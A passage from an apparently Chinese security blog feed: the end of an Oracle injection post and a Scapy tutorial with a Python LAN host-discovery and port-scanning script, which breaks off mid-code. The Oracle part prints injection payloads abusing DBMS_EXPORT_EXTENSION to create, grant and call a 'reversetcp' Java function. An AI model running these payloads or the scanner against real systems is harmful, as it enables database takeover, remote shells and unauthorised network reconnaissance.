<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;create or replace function reversetcp RETURN VARCHAR2 as language java name &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;shell.run() return String&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;; &#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br></pre></td></tr></table></figure>

<ul>
<li>赋予执行权限</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot; .PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;grant all on reversetcp to public&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br></pre></td></tr></table></figure>

<ul>
<li>调用</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select sys.reversetcp from dual</span><br></pre></td></tr></table></figure>



<p>Oracle利用工具：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2phczUwMm4vb3JhY2xlU2hlbGwlRUYlQkMlODglRTUlQTQlQTclRTQlQkQlQUMlRTUlQkElOTQlRTglQUYlQTUlRTYlOTglQUYlRTYlQjIlQTElRTYlOUMlODklRTYlOTclQjYlRTklOTclQjQlRTUlQUUlOEMlRTUlOTYlODQlRUYlQkMlODk=">https://github.com/jas502n/oracleShell（大佬应该是没有时间完善）<i class="fa fa-external-link-alt"></i></span></p>
<p>[1] <span class="exturl" data-url="aHR0cHM6Ly9yZWRuM2NrLmdpdGh1Yi5pby8yMDE4LzA0LzI1L09yYWNsZSVFNiVCMyVBOCVFNSU4NSVBNS0lRTUlOTElQkQlRTQlQkIlQTQlRTYlODklQTclRTglQTElOEMtU2hlbGwlRTUlOEYlOEQlRTUlQkMlQjkv">https://redn3ck.github.io/2018/04/25/Oracle%E6%B3%A8%E5%85%A5-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Shell%E5%8F%8D%E5%BC%B9/<i class="fa fa-external-link-alt"></i></span></p>
<p>[2] <span class="exturl" data-url="aHR0cHM6Ly93d3cudHIweS53YW5nLzIwMTkvMDQvMTYvT3JhY2xlJUU2JUIzJUE4JUU1JTg1JUE1JUU2JThDJTg3JUU1JThDJTk3L2luZGV4Lmh0bWwjJUU2JThBJUE1JUU5JTk0JTk5JUU2JUIzJUE4JUU1JTg1JUE1">https://www.tr0y.wang/2019/04/16/Oracle%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/index.html#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5<i class="fa fa-external-link-alt"></i></span></p>
<p>[3] <span class="exturl" data-url="aHR0cDovL21lZGlhLmJsYWNraGF0LmNvbS9iaC11cy0xMC93aGl0ZXBhcGVycy9TaWRkaGFydGgvQmxhY2tIYXQtVVNBLTIwMTAtU2lkZGhhcnRoLUhhY2tpbmctT3JhY2xlLWZyb20tdGhlLVdlYi13cC5wZGY=">http://media.blackhat.com/bh-us-10/whitepapers/Siddharth/BlackHat-USA-2010-Siddharth-Hacking-Oracle-from-the-Web-wp.pdf<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>知识整理</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>命令执行</tag>
        <tag>ORACLE</tag>
      </tags>
  </entry>
  <entry>
    <title>Python Scapy小工具</title>
    <url>/posts/d9f224db/</url>
    <content><![CDATA[<p><code>Scapy</code>是一个可以让用户发送、侦听和解析并伪装网络报文的Python程序。这些功能可以用于制作侦测、扫描和攻击网络的工具。</p>
<p>换言之，<code>Scapy</code> 是一个强大的操纵报文的交互程序。它可以伪造或者解析多种协议的报文，还具有发送、捕获、匹配请求和响应这些报文以及更多的功能。<code>Scapy</code> 可以轻松地做到像扫描(scanning)、路由跟踪(tracerouting)、探测(probing)、单元测试(unit tests)、攻击(attacks)和发现网络(network discorvery)这样的传统任务。它可以代替<code>hping</code>,<code>arpspoof</code>,<code>arp-sk</code>,<code>arping</code>,<code>p0f</code> 甚至是部分的<code>Namp</code>,<code>tcpdump</code>和<code>tshark</code> 的功能。</p>
<a id="more"></a>

<h1 id="Scapy"><a href="#Scapy" class="headerlink" title="Scapy"></a>Scapy</h1><p>参考：</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9zY2FweS5yZWFkdGhlZG9jcy5pby9lbi9sYXRlc3QvdXNhZ2UuaHRtbCNpY21wLXBpbmc=">https://scapy.readthedocs.io/en/latest/usage.html#icmp-ping<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYmFpaHVhbGluL3AvMTA3MzA1MTMuaHRtbA==">https://www.cnblogs.com/baihualin/p/10730513.html<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><code>Scapy</code>  主要做两件事：发送报文和接收回应。您定义一系列的报文，它发送这些报文，收到回应，将收到的回应和请求匹配，返回一个存放着(request,  answer)即(请求, 回应)的报文对(packet couples)的列表(list)和一个没有匹配的报文的列表(list)。这样对于像<code>Nmap</code>和<code>hping</code> 这样的工具有一个巨大的优势：回应没有被减少 (open/closed/filtered)而是完整的报文。</p>
<p><strong>导入scapy方式：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure>

<h2 id="常用包解析"><a href="#常用包解析" class="headerlink" title="常用包解析"></a>常用包解析</h2><h3 id="SR包解析"><a href="#SR包解析" class="headerlink" title="SR包解析"></a>SR包解析</h3><p><code>sr(IP(dst=&#39;192.168.1.0/24&#39;)/TCP(dport=(1,65535)), timeout=2)</code></p>
<p>发送三层数据包，等待接收一个或多个数据包的响应(注意：当依次向每个IP的65535个端口发送完才算执行完这个函数，而不是调用一次只发一个包，以下所有发包方式都与之一样)</p>
<ul>
<li>发送ICMP数据包，查看接受到的数据</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>reply_packet = sr(IP(dst=<span class="string">&#x27;114.114.114.114&#x27;</span>)/ICMP(), timeout=<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(type(reply_packet))</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">tuple</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span>(<span class="params">reply_packet</span>)</span></span><br><span class="line"><span class="class">(<span class="params">&lt;Results: TCP:<span class="number">0</span> UDP:<span class="number">0</span> ICMP:<span class="number">1</span> Other:<span class="number">0</span>&gt;, &lt;Unanswered: TCP:<span class="number">0</span> UDP:<span class="number">0</span> ICMP:<span class="number">0</span> Other:<span class="number">0</span>&gt;</span>)</span></span><br></pre></td></tr></table></figure>

<p>解析：返回的数据包为<code>tuple</code>格式，也即是元组。元组内第一个元素为接受到的响应包，第二个元素为没有接受到的响应包。</p>
<ul>
<li>查看响应包的内容</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(reply_packet[<span class="number">0</span>].res)</span><br><span class="line">[(&lt;IP  frag=<span class="number">0</span> proto=icmp dst=<span class="number">114.114</span><span class="number">.114</span><span class="number">.114</span> |&lt;ICMP  |&gt;&gt;, &lt;IP  version=<span class="number">4</span> ihl=<span class="number">5</span> tos=<span class="number">0x0</span> len=<span class="number">28</span> id=<span class="number">57023</span> flags= frag=<span class="number">0</span> ttl=<span class="number">76</span> proto=icmp chksum=<span class="number">0x9083</span> src=<span class="number">114.114</span><span class="number">.114</span><span class="number">.114</span> dst=<span class="number">192.168</span><span class="number">.90</span><span class="number">.17</span> |&lt;ICMP  type=echo-reply code=<span class="number">0</span> chksum=<span class="number">0x1600</span> id=<span class="number">0x0</span> seq=<span class="number">0x0</span> |&lt;Padding  load=<span class="string">&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span> |&gt;&gt;&gt;)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(reply_packet[<span class="number">0</span>].res[<span class="number">0</span>][<span class="number">1</span>].fields)</span><br><span class="line">&#123;<span class="string">&#x27;options&#x27;</span>: [], <span class="string">&#x27;version&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;ihl&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;tos&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;len&#x27;</span>: <span class="number">28</span>, <span class="string">&#x27;id&#x27;</span>: <span class="number">57023</span>, <span class="string">&#x27;flags&#x27;</span>: &lt;Flag <span class="number">0</span> ()&gt;, <span class="string">&#x27;frag&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;ttl&#x27;</span>: <span class="number">76</span>, <span class="string">&#x27;proto&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;chksum&#x27;</span>: <span class="number">36995</span>, <span class="string">&#x27;src&#x27;</span>: <span class="string">&#x27;114.114.114.114&#x27;</span>, <span class="string">&#x27;dst&#x27;</span>: <span class="string">&#x27;192.168.90.17&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>解析：得到的响应包是个列表，第一个元素为发送的数据包，第二个元素为返回的数据包。使用<code>xx.res[0][1].fields</code>(返回字典)查看返回包的具体内容;同时也可以直接用show(返回字符串)方法查看包体内容。其实<code>reply_packet[0].res[0][1].fields</code> == <code>reply_packet[0].res[0][1][0].fields</code>,res的第三位[0]表示精确到第几层,这里[0]代表IP层,[1]进一层到传输层,[2]进一步到应用层。</p>
<h3 id="SR1包解析"><a href="#SR1包解析" class="headerlink" title="SR1包解析"></a>SR1包解析</h3><p><code>reply_packet = sr1(IP(dst=&#39;114.114.114.114&#39;)/ICMP(), timeout=2)</code></p>
<p>发送三层数据包，并仅仅只等待接收一个数据包的响应</p>
<ul>
<li>发送ICMP数据包，查看接受到的数据</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>reply_packet = sr1(IP(dst=<span class="string">&#x27;114.114.114.114&#x27;</span>)/ICMP(), timeout=<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(reply_packet)</span><br><span class="line"><span class="string">b&#x27;E\x00\x00\x1cu\xb7\x00\x00K\x01\xfa\x8brrrr\xc0\xa8Z\x11\x00\x00\x16\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(reply_packet.fields)</span><br><span class="line">&#123;<span class="string">&#x27;options&#x27;</span>: [], <span class="string">&#x27;version&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;ihl&#x27;</span>: <span class="number">5</span>, <span class="string">&#x27;tos&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;len&#x27;</span>: <span class="number">28</span>, <span class="string">&#x27;id&#x27;</span>: <span class="number">30135</span>, <span class="string">&#x27;flags&#x27;</span>: &lt;Flag <span class="number">0</span> ()&gt;, <span class="string">&#x27;frag&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;ttl&#x27;</span>: <span class="number">75</span>, <span class="string">&#x27;proto&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;chksum&#x27;</span>: <span class="number">64139</span>, <span class="string">&#x27;src&#x27;</span>: <span class="string">&#x27;114.114.114.114&#x27;</span>, <span class="string">&#x27;dst&#x27;</span>: <span class="string">&#x27;192.168.90.17&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>解析：sr1返回的对象没有太多复杂东西,直接相当于sr返回对象的<code>reply_packet[0].res[0][1]</code>,可以理解为sr1返回的对象是sr返回对象的一个子集。所以可以和sr一样直接用fields来读取其内容。</p>
<h3 id="SRP包解析"><a href="#SRP包解析" class="headerlink" title="SRP包解析"></a>SRP包解析</h3><p><code>reply_packet = srp(Ether(dst=&#39;00ff:ff:ff:ff:ff:ff&#39;)/IP(dst=&#39;114.114.114.114&#39;)/ICMP())</code></p>
<p>发送二层数据包，并且等待回应(这个函数可以编辑二层头部，sr()不能编辑二层头部)</p>
<ul>
<li>发送ICMP数据包，查看接受到的数据</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>reply_packet = srp(Ether(dst=<span class="string">&#x27;00ff:ff:ff:ff:ff:ff&#x27;</span>)/IP(dst=<span class="string">&#x27;114.114.114.114&#x27;</span>)/ICMP())</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(reply_packet[<span class="number">0</span>].res[<span class="number">0</span>][<span class="number">1</span>].fields)</span><br><span class="line">&#123;<span class="string">&#x27;dst&#x27;</span>: <span class="string">&#x27;38:f9:d3:bd:38:f6&#x27;</span>, <span class="string">&#x27;src&#x27;</span>: <span class="string">&#x27;e8:68:19:42:1a:7d&#x27;</span>, <span class="string">&#x27;type&#x27;</span>: <span class="number">2048</span>&#125;</span><br></pre></td></tr></table></figure>

<p>解析：这里默认只给出了二层头部,可以通过调节res后第三位的值来选择性查看每层信息,res的第三位[0]表示精确到第几层,[0]代表二层,[1]进一层到IP层,[2]进一步到传输层,[3]进一步到应用层</p>
<h2 id="存活主机及端口扫描"><a href="#存活主机及端口扫描" class="headerlink" title="存活主机及端口扫描"></a>存活主机及端口扫描</h2><p>主要是为了探测内网存活主机以及端口扫描。使用了线程池，就是觉得简单，没考虑其他情况。。。</p>
<ul>
<li><p>-i 指定目标地址，192.168.90.2或者192.168.90.0/24</p>
</li>
<li><p>-t 同时指定线程池大小， –ta 指定存活主机扫描线程池，–tp指定端口扫描线程池</p>
</li>
<li><p>-p 80,81,88-90,90 指定扫描的端口，不指定则使用默认。</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># FileName  :  surhpscan.py</span></span><br><span class="line"><span class="comment"># Time      :  2020/04/15 15:13:28</span></span><br><span class="line"><span class="comment"># Author    :  OuDeNiu</span></span><br><span class="line"><span class="comment"># Email     :  havebutno@gmail.com</span></span><br><span class="line"><span class="comment"># Version   :  1.0</span></span><br><span class="line"><span class="comment"># Descript  :  主要用于内网主机探测(首先探测存活主机，然后对存活主机端口扫描)</span></span><br><span class="line"><span class="comment">#                   冗余部分为测试代码，，，</span></span><br><span class="line">    <span class="comment"># 以下修改为了美化</span></span><br><span class="line">    <span class="comment"># scapy模块sendrecv.py 的 SndRcvHandler类   verbose参数(文件的88行)，修改为0</span></span><br><span class="line">        <span class="comment"># if verbose is None:</span></span><br><span class="line">        <span class="comment">#     verbose = 0</span></span><br><span class="line">        <span class="comment">#     # verbose = conf.verb</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> IPy</span><br><span class="line"><span class="keyword">from</span> colorama <span class="keyword">import</span> Fore, init</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动重置颜色</span></span><br><span class="line">init(autoreset=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Nscan</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, hosts, threads=None, ta=None, tp=None, inp_port=None</span>):</span></span><br><span class="line">        <span class="comment"># 默认扫描的端口好</span></span><br><span class="line">        self.default_port = [<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">25</span>,<span class="number">80</span>,<span class="number">81</span>,<span class="number">82</span>,<span class="number">83</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">86</span>,<span class="number">87</span>,<span class="number">88</span>,<span class="number">89</span>,<span class="number">90</span>,<span class="number">95</span>,<span class="number">107</span>,<span class="number">115</span>,<span class="number">135</span>,<span class="number">139</span>,<span class="number">161</span>,<span class="number">174</span>,<span class="number">389</span>,<span class="number">443</span>,<span class="number">445</span>,<span class="number">444</span>,<span class="number">465</span>,<span class="number">631</span>,<span class="number">636</span>,<span class="number">512</span>,<span class="number">513</span>,<span class="number">751</span>,<span class="number">1080</span>,<span class="number">1081</span>,<span class="number">1082</span>,<span class="number">1083</span>,<span class="number">1084</span>,<span class="number">1085</span>,<span class="number">1086</span>,<span class="number">1087</span>,<span class="number">1088</span>,<span class="number">1089</span>,<span class="number">1090</span>,<span class="number">1433</span>,<span class="number">1434</span>,<span class="number">1521</span>,<span class="number">1527</span>,<span class="number">1534</span>,<span class="number">1649</span>,<span class="number">1985</span>,<span class="number">1997</span>,<span class="number">1999</span>,<span class="number">3306</span>,<span class="number">3389</span>,<span class="number">5000</span>,<span class="number">5357</span>,<span class="number">5432</span>,<span class="number">5698</span>,<span class="number">6379</span>,<span class="number">7001</span>,<span class="number">7002</span>,<span class="number">8000</span>,<span class="number">8001</span>,<span class="number">8002</span>,<span class="number">8003</span>,<span class="number">8004</span>,<span class="number">8005</span>,<span class="number">8006</span>,<span class="number">8007</span>,<span class="number">8008</span>,<span class="number">8009</span>,<span class="number">8010</span>,<span class="number">8011</span>,<span class="number">8012</span>,<span class="number">8013</span>,<span class="number">8080</span>,<span class="number">8081</span>,<span class="number">8082</span>,<span class="number">8083</span>,<span class="number">8084</span>,<span class="number">8090</span>,<span class="number">8091</span>,<span class="number">8092</span>,<span class="number">8093</span>,<span class="number">9092</span>,<span class="number">27017</span>,<span class="number">11211</span>]</span><br><span class="line">        <span class="comment"># 存放最终需要扫描的IP</span></span><br><span class="line">        self.ips = []</span><br><span class="line">        <span class="comment"># 如果输入端口，则存放最终扫描的端口，如果不存放则使用默认的端口号</span></span><br><span class="line">        self.port_scan = []</span><br><span class="line">        <span class="comment"># 接收参数</span></span><br><span class="line">        self.hosts = hosts</span><br><span class="line">        self.inp_port = inp_port</span><br><span class="line">        self.threads = threads</span><br><span class="line">        self.ta = ta</span><br><span class="line">        self.tp = tp</span><br><span class="line">        <span class="comment"># 解析IP、线程、端口</span></span><br><span class="line">        self.recv_ip()</span><br><span class="line">        self.recv_thread()</span><br><span class="line">        self.recv_port()</span><br><span class="line">        <span class="comment"># 最终存活主机的IP地址</span></span><br><span class="line">        self.alive_ip = []</span><br><span class="line">        <span class="comment"># 端口扫描的结果 存放格式为：    [ [&#x27;IP&#x27;,[port,port,port] , [&#x27;IP&#x27;,[port,port,port]  ]</span></span><br><span class="line">        self.result_port_scan = []</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv_thread</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 处理传入的线程池大小  最后形成self.ta(存活主机探测线程池)   self.tp(端口扫描线程池)</span></span><br><span class="line">        <span class="keyword">if</span> self.threads <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">if</span> self.ta <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                self.ta = <span class="number">10</span></span><br><span class="line">                <span class="keyword">if</span> self.tp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    self.tp = <span class="number">5</span></span><br><span class="line">                <span class="keyword">else</span>: </span><br><span class="line">                    self.tp = self.tp</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.ta = int(self.ta)</span><br><span class="line">                <span class="keyword">if</span> self.tp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    self.tp = <span class="number">5</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.tp = int(self.tp)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.ta = self.tp = int(self.threads)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析IP并加入到需要探测的主机列表中</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv_ip</span>(<span class="params">self</span>):</span></span><br><span class="line">        inp_ips = self.hosts.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        <span class="comment"># 设置make_net 为1 时，可以自定义</span></span><br><span class="line">        <span class="keyword">for</span> ips <span class="keyword">in</span> inp_ips:</span><br><span class="line">            ips = IPy.IP(ips, make_net=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">                self.ips.append(str(ip))</span><br><span class="line">        print(Fore.YELLOW + <span class="string">&#x27;[*]:已将您输入的IP解析完毕。正在启动主机存活探测，请稍后。。。&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析端口</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv_port</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 如果不指定端口则默认端口，否则对输入的参数进行转化</span></span><br><span class="line">        <span class="keyword">if</span> inp_port <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            self.port_scan = self.default_port</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 以逗号分割输入的端口字符串</span></span><br><span class="line">            f_port = self.inp_port.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">            <span class="comment"># 循环分割后的字符串，判断是否存在  &#x27;-&#x27; 号(为了可以实现  -p 81,82,8080-8090的方式)</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> f_port:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;-&#x27;</span> <span class="keyword">in</span> i:</span><br><span class="line">                    s_port = i.split(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">                    <span class="keyword">for</span> port <span class="keyword">in</span> range(int(s_port[<span class="number">0</span>]),int(s_port[:<span class="number">-1</span>])+<span class="number">1</span>):</span><br><span class="line">                        self.port_scan.append(port)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.port_scan.append(int(i))</span><br><span class="line">            print(Fore.YELLOW + <span class="string">&#x27;端口处理完毕，已指派您指定的端口。&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 判断主机是否存活</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_host</span>(<span class="params">self, cip</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># # 利用ARP进行扫描，默认将扫描结果加入到存活主机列表中  self.alive_ip</span></span><br><span class="line">            <span class="comment"># a,b = arping(cip)</span></span><br><span class="line">            <span class="comment"># if a.res:</span></span><br><span class="line">            <span class="comment">#     print(&#x27;++++++++YES++++++++&#x27;)</span></span><br><span class="line">            <span class="comment">#     self.alive_ip.append(cip)</span></span><br><span class="line">            <span class="comment"># else:</span></span><br><span class="line">            <span class="comment">#     print(&#x27;主机不存活&#x27;)</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 利用ICMP发包进行存活主机探测，默认只发一个包(可设置retry参数指定次数，但是受timeout参数影响，在不超时时间内重试),  timeout影响准确性，建议为大于1</span></span><br><span class="line">            a = sr1(IP(dst=cip)/ICMP()/<span class="string">&quot;ceshi&quot;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="comment"># 修改了sendrecv.py 的 SndRcvHandler类   verbose参数(文件的88行)，修改为0(非0时输出发包过程。这里为了自定义输出过程，美化程序。。。。。)</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 判断响应包中ICMP是否为空，为空不存活，不为空输出 该IP存活，并将该IP加入到存活主机列表</span></span><br><span class="line">            <span class="keyword">if</span> a.getlayer(ICMP):</span><br><span class="line">                <span class="comment"># 输出存活信息 参考官网文档</span></span><br><span class="line">                print(Fore.GREEN + a.sprintf(<span class="string">&quot;[*] %IP.src% is alive&quot;</span>))</span><br><span class="line">                self.alive_ip.append(cip)</span><br><span class="line">                <span class="keyword">return</span> a.sprintf(<span class="string">&quot;[*] %IP.src% is alive&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:<span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="comment"># 设置屏蔽错误信息</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            <span class="comment"># print(e)</span></span><br><span class="line">            <span class="comment"># print(&#x27;主机不存活&#x27;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># # 判断主机存活的线程池</span></span><br><span class="line">    <span class="comment"># def thread_check_alive(self):</span></span><br><span class="line">    <span class="comment">#     pool = ThreadPoolExecutor(self.ta)</span></span><br><span class="line">    <span class="comment">#     for ip in self.ips:</span></span><br><span class="line">    <span class="comment">#         pool.submit(self.check_host, ip)</span></span><br><span class="line">    <span class="comment">#     pool.shutdown()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># # scapy模块 sr()函数 TCP端口扫描(经过测试，在不开启多线程情况下，扫描准确性与timeout 有关，一般设置2s; 如果开启多线程，则扫描结果非常不精确。[未加锁情况下])</span></span><br><span class="line">    <span class="comment"># def check_port(self,cip):</span></span><br><span class="line">    <span class="comment">#     try:</span></span><br><span class="line">    <span class="comment">#         res,unans = sr(IP(dst=cip)/TCP(flags=&quot;S&quot;, dport=(self.default_port)),timeout=2)</span></span><br><span class="line">    <span class="comment">#         # 修改了sendrecv.py 的 SndRcvHandler类   verbose参数(文件的88行)，修改为0(非0时输出发包过程。这里为了自定义输出过程，美化程序。。。。。)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#         if res.res:</span></span><br><span class="line">    <span class="comment">#             port_reslut = []</span></span><br><span class="line">    <span class="comment">#             # 循环接受的数据包，读取其中头部flags信息，如果为SA则端口存活。</span></span><br><span class="line">    <span class="comment">#             for i in range(len(res.res)):</span></span><br><span class="line">    <span class="comment">#                 flags = res.res[i][1].getlayer(TCP).fields</span></span><br><span class="line">    <span class="comment">#                 if flags[&#x27;flags&#x27;] == &#x27;SA&#x27;:</span></span><br><span class="line">    <span class="comment">#                     port_reslut.append(flags[&#x27;sport&#x27;])</span></span><br><span class="line">    <span class="comment">#                     # RA 代表不存活 SA   存活</span></span><br><span class="line">    <span class="comment">#             # 经过上述循环判断，得到的存活端口号列表 与主机IP形成新的列表，存放在最终的扫描结果中。 如果端口扫描结果为空，则不计入最终结果</span></span><br><span class="line">    <span class="comment">#             if port_reslut:</span></span><br><span class="line">    <span class="comment">#                 cip_result = [cip,port_reslut]</span></span><br><span class="line">    <span class="comment">#                 self.result_port_scan.append(cip_result)</span></span><br><span class="line">    <span class="comment">#             else:pass</span></span><br><span class="line">    <span class="comment">#     except Exception as e:</span></span><br><span class="line">    <span class="comment">#         print(e)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># socket连接，不返回banner信息</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">socket_port_scan</span>(<span class="params">self,cip</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            port_reslut = []</span><br><span class="line">            <span class="comment"># 循环端口进行扫描</span></span><br><span class="line">            <span class="keyword">for</span> port <span class="keyword">in</span> self.port_scan:</span><br><span class="line">                s = socket.socket()</span><br><span class="line">                s.settimeout(<span class="number">0.5</span>)</span><br><span class="line">                <span class="comment"># print(&#x27;[*]:&#x27;+cip+ &#x27;:&#x27; +str(port))</span></span><br><span class="line">                <span class="keyword">if</span> s.connect_ex((cip, port)) == <span class="number">0</span>:</span><br><span class="line">                    <span class="comment"># print(&#x27;[+] : &#x27; + str(port))</span></span><br><span class="line">                    port_reslut.append(port) </span><br><span class="line">                    s.close()  </span><br><span class="line">            <span class="comment"># 经过上述循环判断，得到的存活端口号列表 与主机IP形成新的列表，存放在最终的扫描结果中。 如果端口扫描结果为空，则不计入最终结果</span></span><br><span class="line">            <span class="keyword">if</span> port_reslut:</span><br><span class="line">                cip_result = [cip,port_reslut]</span><br><span class="line">                self.result_port_scan.append(cip_result)</span><br><span class="line">                print(Fore.GREEN + <span class="string">&#x27;[*]:&#123;0&#125; 开放端口扫描完毕&#x27;</span>.format(cip))</span><br><span class="line">                <span class="keyword">return</span> &#123;cip:port_reslut&#125;</span><br><span class="line">            <span class="keyword">else</span>:<span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="comment"># 屏蔽错误信息</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span 